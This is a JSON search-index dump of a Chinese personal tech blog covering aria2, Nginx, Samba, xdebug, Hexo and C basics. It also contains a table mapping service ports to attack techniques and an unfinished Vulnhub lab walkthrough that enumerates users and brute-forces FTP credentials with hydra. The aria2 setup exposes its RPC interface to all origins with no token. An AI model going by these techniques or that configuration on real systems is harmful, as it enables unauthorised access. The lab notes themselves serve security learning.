/"}]},{"title":"让树莓派有点事做05--下载机","date":"2020-06-08T01:36:11.000Z","path":"wiki/折腾笔记/树莓派/让树莓派有点事做05--下载机/","text":"让树莓派有点事做05–下载机你的树莓派还在吃灰吗？来试试用树莓派来做下载机吧 历史文章： 让树莓派有点事做01–安装系统 让树莓派有点事做02–私有云服务 让树莓派有点事做03–外网访问 让树莓派有点事做04–git服务器 前言好久没有更新树莓派玩法文章了，最近看到下载的东西下载的好慢，又不想开一夜电脑去下载，于是我看了一眼树莓派，树莓派看了一眼我，一拍即合，开搞！ 本文将介绍使用aria2在树莓派上部署下载服务，通过aria-NG来提供Web端页面，使用Samba或者【】来将文件下载出来。 项目地址：https://aria2.github.io/ 开始环境： RaspberryPi 3B+ ubuntu server for raspberryPi 系统 安装&amp;配置 : Aria2123456# 安装sudo apt install aria2# 配置mkdir ~/aria2touch ~/aria2/aria2.sessionvim ~/aria2/aria2.conf 编辑aria2.conf：懒得研究这么一堆配置的话可以把下面这一大段复制进去，然后把几个路径改成自己的即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112## 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=~/aria2/downloads# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项#file-allocation=none# 断点续传continue=true## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5#max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=5# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5#split=5# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=0# 单个任务上传速度限制, 默认:0#max-upload-limit=0# 禁用IPv6, 默认:false#disable-ipv6=true# 连接超时时间, 默认:60#timeout=60# 最大重试次数, 设置为0表示不限制重试次数, 默认:5#max-tries=5# 设置重试等待的秒数, 默认:0#retry-wait=0## 进度保存相关 ### 从会话文件中读取下载任务input-file=~/aria2/aria2.session# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=~/aria2/aria2.session# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800#rpc-listen-port=6800# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项#rpc-secret=&lt;TOKEN&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接#rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥#rpc-certificate=/path/to/certificate.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件#rpc-private-key=/path/to/certificate.key## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55#bt-max-peers=55# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=false# 打开IPv6 DHT功能, PT需要禁用#enable-dht6=false# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=false# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=false# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=0# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:falsebt-save-metadata=true 完成了以后我们测试一下aria是否能够成功运行： 1aria2c --conf-path=~/aria2/aria2.conf 可通过查看aria是否开启6800端口来进行判断： 1ss -lptn 如果见到类似如下字样，则说明运行成功： 1LISTEN 0 128 0.0.0.0:6800 0.0.0.0:* users:((\"aria2c\",pid=2213,fd=5)) 也可以通过查看进程来进行判断,有查询到结果则说明运行成功： 12ubuntu@ubuntu:~$ ps -elf | grep \"aria*\"1 S ubuntu 2213 1 0 80 0 - 12546 SyS_ep 13:25 ? 00:00:00 aria2c --conf-path=/home/ubuntu/.aria2/aria2.conf -D 为Aria2配置Web界面这里我们需要安装Nginx服务，关于基本的安装使用，可参考这一篇文章进行：Nginx搭建Web服务器 安装完之后，我们在虚拟主机里添加如下配置来设置jsonrpc反向代理： 123456789101112131415server&#123; listen 80; location /jsonrpc &#123; proxy_pass http://localhost:6800/jsonrpc; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $host; #以下代码使支持WebSocket proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; &#125;&#125; 设置完成后，我们需要去把Web界面安装一下： 12345678910# 切换到主目录mkdir ~/AriaNGcd ~/AriaNG# 下载Aria-NGwget https://github.com/mayswind/AriaNg/releases/download/1.1.6/AriaNg-1.1.6.zip# 解压unzip AriaNg-1.1.6.ziprm AriaNg-1.1.6.zip# 将AriaNG里的内容放到/var/www/里sudo mv ~/AriaNG/ /var/www/ 接下来通过Web浏览器访问自己的ip即可访问Aria服务了 如果不喜欢这个ui还可以自行搜索选择其他的ui，例如： webui-aria2：https://github.com/ziahamza/webui-aria2 Glutton：https://github.com/NemoAlex/glutton 获取下载机下载的文件当然，可以通过很多方法来实现文件下载功能，可以通过搭建Web服务器来下载文件，或者使用大神们开发的浏览器插件，当然也可以使用Samba服务来将下载的文件目录挂载到我们的电脑里。 在家里或者宿舍里这种局域网环境，我感觉用Samba服务会更加方便 关于Samba服务的基本配置使用，可以参考这篇文章：Samba服务搭建与配置 参考资料 树莓派aria2下载器配置 https://www.jianshu.com/p/09d9207c1621 https://tlanyan.me/setup-samba-in-raspberry-pi/ Aria2 Manual https://aria2.github.io/manual/en/html/ Aria2基础上手指南 https://zhuanlan.zhihu.com/p/30666881","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"树莓派","slug":"折腾笔记/树莓派","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"Nginx搭建Web服务器","date":"2020-06-06T13:13:21.000Z","path":"wiki/渗透笔记/常见服务/80-http/nginx搭建web服务器/","text":"Nginx搭建Web服务器本文将简单介绍Nginx的基础使用，包括两部分内容：nginx搭建web服务和配置nginx反向代理，后面会慢慢更新关于nginx的其他内容~ Nginx 简介Nginx是一个开源、轻量、快速、可扩展的Web服务器 可配置能力弱于Apache，适用于大流量、高并发场景 可与Apache共用，Apache处理动态内容，Nginx处理静态内容 本文使用环境： Ubuntu Server 20.04 LTS 使用Nginx搭建静态 Web服务安装Nginx： 1sudo apt install nginx 配置虚拟主机Nginx配置目录在/etc/nginx，常用的配置文件： 1234nginx.conf # 主配置文件sites-available # 可用的虚拟主机sites-enabled # 启用的虚拟主机snippets # 需要复用的配置片段 nginx.conf 配置： 123456789101112131415161718user www-data;# nginx 进程账号worker_processes auto;# 进程数worker_connections 768;# 每个进程连接数sendfile on;# 内核实现（静态性能主要来源）tcp_nopush on;# 优化发包大小（多次请求一起回应）tcp_nodelay on;# 优化包延时keepalive_timeout 65;# 每次连接的保持时间types_hash_max_size 2048;# mime 类静态内容Hash表大小gzip on;# 压缩（加快传输速度） 此配置文件有六部分组成 main：用于进行nginx全局信息的配置 events：用于nginx工作模式的配置 http：用于进行http协议信息的一些配置 server：用于进行服务器访问信息的配置 location：用于进行访问路由的配置 upstream：用于进行负载均衡的配置 虚拟主机配置 用到的几个目录： 可用站点：/etc/nginx/sites-available/ 启用站点：/etc/nginx/sites-enabled/ Web目录：/var/www/html/ 基本的站点配置如下： 12345678910# /etc/nginx/sites-available/test.comserver&#123; listen 8080; # 监听8080端口 server_name test.com; # 用户访问此地址由该虚拟主机进行处理 # 虚拟主机名称可用通配符*和正则表达式，也可指定多个名称 root /var/www/html; # Web根目录 location / # 因为所有请求都是/开头，所以这里表示匹配所有请求 index index.html # 指定首页 try_files $uri $uri/ =404;&#125; 配置反向代理配置反向代理需要在server段里面的location加上proxy_pass http://ip:端口 下面以一个例子来展示效果：这里我用apache2在8080端口开启Web服务，我们通过nginx反向代理来将访问80端口的请求转发到8080端口。 123456789101112# /etc/nginx/sites-available/testserver &#123; listen 80 default_server; listen [::]:80 default_server; index index.html index.htm index.nginx-debian.html; # server_name _; location / &#123; proxy_pass http://192.168.193.131:8080; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; &#125; 正常情况下8080端口的内容： 反向代理后访问的80端口： 参考资料 Nginx虚拟主机配置：https://www.cnblogs.com/jun1019/p/6260674.html Nginx虚拟主机配置：https://www.jianshu.com/p/ab9968ac98ff","tags":[],"categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"},{"name":"常见服务","slug":"渗透笔记/常见服务","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"},{"name":"80-http","slug":"渗透笔记/常见服务/80-http","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/80-http/"}]},{"title":"Samba服务搭建与配置","date":"2020-06-05T15:01:19.000Z","path":"wiki/渗透笔记/常见服务/139-samba/samba服务搭建与配置/","text":"Samba服务搭建与配置本文主要介绍Samba文件服务器的搭建与配置。 samba介绍Samba服务是SMB的一个开源实现，SMB(Server Message block)协议是window下所使用的文件共享协议，我们在linux系统或者其类unix系统当中可以通过samba服务来实现SMB功能。 Samba实现了CIFS的四个基本功能： 文件和打印服务 认证和授权 名称解析 服务宣告 Samba服务是由两个进程组成，分别是nmbd和smbd： nmbd：使用137、138端口，其功能是进行NetBIOS名解析，并提供浏览服务显示网络上的共享资源列表。 smbd：使用139、445端口，其主要功能就是用来管理Samba服务器上的共享目录、打印机等，主要是针对网络上的共享资源进行管理的服务。当要访问服务器时，要查找共享文件，这时我们就要依靠smbd这个进程来管理数据传输。 Samba的工作流程主要为四个阶段：(本段来自知乎文章《Samba协议简介》) 协议协商 客户端在访问Samba服务器时，首先由客户端发送一个SMB negprot请求数据报，并列出它所支持的所有SMB协议版本。服务器在接收到请求信息后开始响应请求，并列出希望使用的协议版本，选择最优的SMB类型。如果没有可使用的协议版本则返回oXFFFFH信息，结束通信。 建立连接 当SMB协议版本确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SesssetupX请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后服务器通过发送一个SesssetupX请应答数据报来允许或拒绝本次连接。 访问共享资源 当客户端和服务器完成了协商和认证之后，它会发送一个Tcon或SMB TconX数据报并列出它想访问网络资源的名称，之后服务器会发送一个SMB TconX应答数据报以表示此次连接是否被接受或拒绝。 断开连接 连接到相应资源，SMB客户端就能够open SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。 samba安装这里我使用的环境是： 服务器：Ubuntu 20.04 LTS 客户机：Windows 10 这里安装使用apt包管理器进行： 12$ sudo apt update &amp;&amp; sudo apt upgrade$ sudo apt install samba samba配置&amp;使用Samba 服务在使用之前需要我们为系统已有的用户创建 Samba的账号（密码与登录系统的密码不一样）： pdbedit命令用于管理SMB服务程序的账户信息数据库，格式为“pdbedit [选项] 账户”。在第一次把账户信息写入到数据库时需要使用-a参数，以后执行修改密码、删除账户等操作时就不在需要该参数。 12345# pdbedit使用说明pdbedit -a username # 创建账号pdbedit -x username # 删除账号pdbedit -L # 列出账号列表pdbedit -Lv username # 列出账号详细信息 创建账号过程： 123456selph@ubuntu:~/samba$ sudo useradd user01selph@ubuntu:~/samba$ sudo id user01uid=1001(user01) gid=1001(user01) groups=1001(user01)selph@ubuntu:~/samba$ sudo pdbedit -a -u user01new password:retype new password: Samba 的配置文件在/etc/samba/smb.conf，使用之前我们需要对配置文件进行编辑 最基本的配置内容以及格式如下： 1234567891011121314# 大致可以分为一个全局设置，若干个共享设置[global] map to guest = Bad User log file = /var/log/samba/%m log level = 1[guest] # This share allows anonymous (guest) access # without authentication! path = /srv/samba/guest/ # 共享路径 read only = yes guest ok = yes guest only = yes 全局设置的属性有： 12345678910111213141516171819202122232425262728293031[global]workgroup = MYGROUP #工作组名称server string = Samba Server Version %v #服务器介绍信息，参数%v为显示SMB版本号log file = /var/log/samba/log.%m #定义日志文件的存放位置与名称，参数%m为来访的主机名max log size = 50 #定义日志文件的最大容量为50KBsecurity = user #安全验证的方式，总共有4种#share：来访主机无需验证口令；比较方便，但是安全性很差#user：需验证来访主机提供口令后才可以访问；提高了安全性#server：使用独立的远程主机验证来访主机提供的口令（集中管理账户）#domain：使用域控制器进行身份验证passdb backend = tdbsam#定义用户后台的类型，共有3种#smbpasswd：使用smbpasswd命令为系统用户设置Samba服务程序的密码#tdbsam：创建数据库文件并使用pdbedit命令建立Samba服务程序的用户#ldapsam：基于LDAP服务进行账户验证load printers = yes#设置在Samba服务启动时是否共享打印机设备cups options = raw#打印机的选项 用户控制类属性有： 12345678910111213141516171819202122232425262728public = yes# 所有用户都可以访问 # 等价于 guest ok =yes/nomap to guest = Bad User # 匿名访问browsable = yes# 可浏览(设置共享是否可游览，如果是no表示隐藏，通过ip+共享名进行访问)writable = yes # 可写，还要看目录权限writable list = maomao,@GROUPNAME,+GROUPNAMEreadonly = yes # 只读设置create mask = 0644 # 客户机创建文件权限directory mask = 0744 # 客户机创建目录的权限valid users = user1，user2，@group1# 禁止登录用户，用户用逗号隔开，组用@ //禁止invalid = # 允许访问控制max connections = # 最大连接数目deadtime = # 断掉连接时间(分钟，0为不限制hosts allow = # 允许主机hosts deny = # 拒绝主机（允许优先） 更多详细设置属性可以参考官方文档 配置完成后，我们可以通过客户端连接Samba服务器进行使用。 Windows连接Samba文件服务器 Windows +R 打开 运行 键入\\\\ip\\diectory，敲击回车即可 通过cmd命令行可以关闭连接： 1234net use # 查看已挂在会话net use \\\\ip\\directory /del # 删除连接 Linux连接Samba文件服务器Linux系统需要下载一个Samba服务的客户端： 1sudo apt install smbclient 使用客户端进行登录访问示例： 123456smbclient -L \\\\192.168.193.161 # 查看该地址的Samba服务提供了哪些目录smbclient \\\\192.168.193.161\\Public --no-pass # 匿名访问Public目录smbclient \\\\192.168.193.161\\Private -U selph# 使用selph账号登录访问Private目录 使用场景1：共享文件服务器任何人都能访问文件服务器的Public目录，且都有写入权限： 创建目录并给写入权限： 12mkdir ~/samba/publicchmod 0766 ~/samba/public 编辑配置文件： 1234567891011[Public] comment = public share folder # 描述 path = /home/selph/samba/public # 共享路径 browseable = yes # 是否可以被发现 writable = yes # 可读写，需要只读的话用：read only = yes guest ok = yes # 允许匿名访问 public = yes 重启Samba服务： 1sudo systemctl restart smbd.service 使用场景2：专享文件服务器只有selph用户可写入，其他用户为只读： 123456789[Private] comment = folder of selph path = /home/selph/samba/private writable = yes write list = selph readonly = yes create mask = 0644 directory mask = 0744 public = yes 重启Samba服务： 1sudo systemctl restart smbd.service 参考资料Linux使用Samba实现文件共享 https://www.cnblogs.com/DevonL/p/11178674.html samba wiki https://wiki.samba.org/index.php/Setting_up_Samba_as_a_Standalone_Server samba docs pdbedit https://www.samba.org/samba/docs/4.11/man-html/pdbedit.8.html linux基础&amp;Samba服务、SMB协议 https://blog.csdn.net/csdn10086110/java/article/details/89174589 Samba 协议简介 https://zhuanlan.zhihu.com/p/41449862 Ubuntu Server 从入门到精通 https://study.163.com/course/introduction/1005266046.htm","tags":[],"categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"},{"name":"常见服务","slug":"渗透笔记/常见服务","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"},{"name":"139-samba","slug":"渗透笔记/常见服务/139-samba","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/139-samba/"}]},{"title":"代码审计学习01--搭建php调试环境","date":"2020-06-05T06:40:50.000Z","path":"wiki/审计笔记/代码审计学习01--搭建环境/","text":"代码审计学习01–搭建php调试环境本文主要记录配置php代码本地调试环境的过程 环境： Windows7 SP1 虚拟机 小皮PHPStudy（WANMP） VS code 准备工作： PHPStudy勾选扩展：PHP xdebug VS code安装插件：PHP xdebug 配置环境–php.ini：编辑当前使用的php版本的php.ini，在最底下添加如下内容： 1234[xdebug]zend_extension = \"\"xdebug.remote_enable = 1xdebug.remote_autostart = 1 其中zend_extension后面填写xdebug.dll的路径 如果需要修改默认监听的端口可以添加如下内容到最后 1xdebug.remote_port = 9001 查了很多教程，基本上到此，这一块的配置都结束了，实际上，这样进行调试并不能断点执行，算是我遇到的一个坑吧，这里需要再把之前的一条配置注释掉才能成功进行断点调试，希望懂的老哥肯指点一二。 然后通过Ctrl+F进行搜索xdebug，将以下内容用;注释掉 1;extension=php_xdebug 到此php.ini的配置就结束了 配置环境–VScode点击File–Preferences–Settings 搜索php，点击Edit in setting.json 编辑我们要用的php的路径到这个json文件中，并保存： 123&#123; \"php.validate.executablePath\": \"C:\\\\phpstudy_pro\\\\Extensions\\\\php\\\\php5.5.9nts\\\\php.exe\"&#125; 这里我们随便准备一个php文件用来测试用（这里需要VScode编辑器处于打开某个目录的状态下才行）： 12345678# index.php&lt;?php$a = 1;$b = 11;echo $a;echo \"&lt;br/&gt;\";echo $c = $a+$b;?&gt; 接下来切换到调试界面 选择创建launch.json： 端口跟php.ini的设置成一样的 到此需要配置的内容就结束了 测试选择断点，点击调试界面上面的run的三角形，或者按F5进入调试 然后通过浏览器打开该网页，回到VS Code，即可进行断点 参考资料微软vscode中使用xdebug调试，断点不执行或跳过断点的坑 https://blog.csdn.net/ajanious/article/details/90143113 PHP开发-VSCode调试： https://zhuanlan.zhihu.com/p/38596789 VScode+phpStudy搭建php代码调试环境 https://www.cnblogs.com/lceFIre/p/12469834.html#XWT3bhDj","tags":[],"categories":[{"name":"审计笔记","slug":"审计笔记","permalink":"http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"}]},{"title":"搭建hexo博客备忘录","date":"2020-06-02T08:21:13.000Z","path":"wiki/备忘笔记/搭建hexo博客备忘录/","text":"搭建hexo博客备忘录安装环境：Ubuntu（WSL2） 教程：https://hexo.io/zh-cn/docs/ 1234567891011#安装Node.JS,node.JS 版本太高会出错wget https://deb.nodesource.com/setup_12.x sudo -E bash setup_12.x sudo apt-get install -y nodejsrm setup_12.x#安装Gitsudo apt install git-core#安装hexosudo npm install -g hexo-cli 配合typora需要修改post模板：./hexo/scaffolds/post.md 1234567891011121314---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;toc: truetags:categories:typora-root-url: &#123;&#123; title &#125;&#125;---## 参考资料&gt; - []()&gt; - []()~","tags":[],"categories":[{"name":"备忘笔记","slug":"备忘笔记","permalink":"http://kn0sky.com/categories/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/"}]},{"title":"C++基础01--初见C++","date":"2020-06-01T07:40:50.000Z","path":"wiki/学习笔记/C++学习笔记/C++语言基础01--初见C++/","text":"C++语言基础01–初见C++本系列笔记基于C++17标准 环境准备","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C++学习笔记","slug":"学习笔记/C-学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"常见端口号&漏洞","date":"2020-06-01T00:06:19.000Z","path":"wiki/渗透笔记/常见服务/常见端口&漏洞/","text":"常见端口号&amp;漏洞 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp：文件传输协议 爆破\\嗅探\\溢出\\后门 22 ssh：远程连接 爆破OpenSSH；28个退格 23 telnet：远程连接 爆破\\嗅探 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输\\DNS劫持\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\\欺骗 110 pop3 爆破 139 samba 爆破\\未授权访问\\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击\\未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令\\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\\注入攻击 1521 oracle 爆破：TNS\\注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\\拒绝服务\\注入 3389 rdp 爆破\\Shift后门 4848 glassfish 爆破：控制台弱口令\\认证绕过 5000 sybase/DB2 爆破\\注入 5432 postgresql 缓冲区溢出\\注入攻击\\爆破：弱口令 5632 pcanywhere 拒绝服务\\代码执行 5900 vnc 爆破：弱口令\\认证绕过 6379 redis 未授权访问\\爆破：弱口令 7001 weblogic Java反序列化\\控制台弱口令\\控制台部署webshell 80/443/8080 web 常见web攻击\\控制台爆破\\对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令\\Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破\\未授权访问","tags":[],"categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"},{"name":"常见服务","slug":"渗透笔记/常见服务","permalink":"http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"}]},{"title":"【Vulnhub】Sunset:nightfall--Workthourgh：未完成","date":"2020-05-31T08:36:15.000Z","path":"wiki/靶机笔记/vulnhub/6-nightfall/","text":"【Vulnhub】Sunset:nightfall–Workthourgh 文章作者：kn0sky 作者博客：kn0sky.com 靶机信息用到的工具/知识 渗透过程 攻击机IP：192.168.101.5 靶机IP：192.168.101.6 端口扫描： 目标开放了21/22/80/139/445/3306端口 这几个端口可能存在的问题：【找图片/表格】 80端口是Apache默认页面，目录扫描之后除了Apache还有一个403进不去 见到samba就枚举用户名： 1enum4linux 192.168.101.6 得到用户名：matt和nightfall 使用hydra去爆破ftp账号弱口令： 得到matt的密码为cheese 登录ftp看看： 参考资料 1nslght-workthrough：https://blog.csdn.net/weixin_44214107/article/details/102617065","tags":[],"categories":[{"name":"靶机笔记","slug":"靶机笔记","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"},{"name":"vulnhub","slug":"靶机笔记/vulnhub","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"}]},{"title":"open-source Write Up","date":"2020-05-29T12:40:50.000Z","path":"wiki/XCTF攻防世界WP/新手练习区/REVERSE/re001-open-source/","text":"open-source Write Up难度：☆☆☆ 这道题提供了一个c语言源代码： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; if (argc != 4) &#123; printf(\"what?\\n\"); exit(1); &#125; unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; printf(\"you are wrong, sorry.\\n\"); exit(2); &#125; unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123; printf(\"ha, you won't get it!\\n\"); exit(3); &#125; if (strcmp(\"h4cky0u\", argv[3])) &#123; printf(\"so close, dude!\\n\"); exit(4); &#125; printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0;&#125; 很显然我们需要让这段代码跑起来并且跑到最后让程序自己算出来flag， 所以我们我们需要把main函数需要的参数值删掉并且放到main函数内去定义,修改如下： 123int main() &#123; int argc &#x3D; 4; char * argv[] &#x3D; &#123;&quot;1&quot;,&quot;51966&quot;,&quot;25&quot;,&quot;h4cky0u&quot;&#125;; 这里的atoi()函数的功能是从前往后取字符串整数部分，所以我们把argv[1]所需要的整数的十六进制转换成十进制0xcafe，即51996，即可 然后点击调试，程序即可顺利运行到最后","tags":[],"categories":[{"name":"XCTF攻防世界WP","slug":"XCTF攻防世界WP","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/"},{"name":"新手练习区","slug":"XCTF攻防世界WP/新手练习区","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"},{"name":"REVERSE","slug":"XCTF攻防世界WP/新手练习区/REVERSE","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/"}]},{"title":"C语言基础09--C预处理器和C库","date":"2020-05-28T08:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础09--C预处理器和C库/","text":"C语言基础09–C预处理器和C库预处理器预处理器是#号开头的，比如宏：#define 宏的基本用法 123456#include&lt;stdio.h&gt;#define Five 5int main()&#123; printf(\"%d\",Five);//在编译过程中，Five会被直接替换成5 return 0;&#125; 带参数的宏 123456#include&lt;stdio.h&gt;#define Five(X) X*Xint main()&#123; printf(\"%d\",Five(5));//在编译过程中，替换成一段表达式 return 0;&#125; 123456#include&lt;stdio.h&gt;#define Five(X) printf(\"This is %d\",X)int main()&#123; Five(5);//在编译过程中，替换成一段表达式,打印字符串出来 return 0;&#125; 条件的预处理器//#indef #else #endif 1234567891011121314//#indef #else #endif#include&lt;stdio.h&gt;#define Five 5#undef Fiveint main() &#123; //通过define来判断执行什么语句#ifdef Five printf(\"yes\");#else printf(\"no\");#endif return 0;&#125; 条件的预处理器 #if #elif #endif 1234567891011121314#include&lt;stdio.h&gt;#define Five 4//#undef Fiveint main() &#123;#if Five ==5 printf(\"yes\");#elif Five ==4 printf(\"no\");#endif return 0;&#125; 可以用于不同版本系统的编译 头文件代码开头的#include&lt;stdio.h&gt;是将该库中的所有代码复制进代码中，可以直接调用","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础08--结构体","date":"2020-05-28T04:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础08--结构体/","text":"C语言基础08–结构体&amp;联合体&amp;枚举类型结构体的声明：123456789101112131415#include&lt;stdio.h&gt;int main() &#123; struct NPC &#123; char * Name; int HP; int MP; &#125;; struct NPC xiaoer; xiaoer.Name = \"xiaoer\"; xiaoer.HP = 100; xiaoer.MP = 200; return 0;&#125; 结构体指针1234567891011121314151617#include&lt;stdio.h&gt;int main() &#123; struct NPC &#123; char * Name; int HP; int MP; &#125;; struct NPC npcarr[100]; struct NPC *npcindex;//声明一个结构体指针 npcindex = &amp;npcarr[0]; npcindex-&gt;Name = \"xiao1\";//通过指针可以修改内容 npcindex++;//指针每次移动一个结构体的量 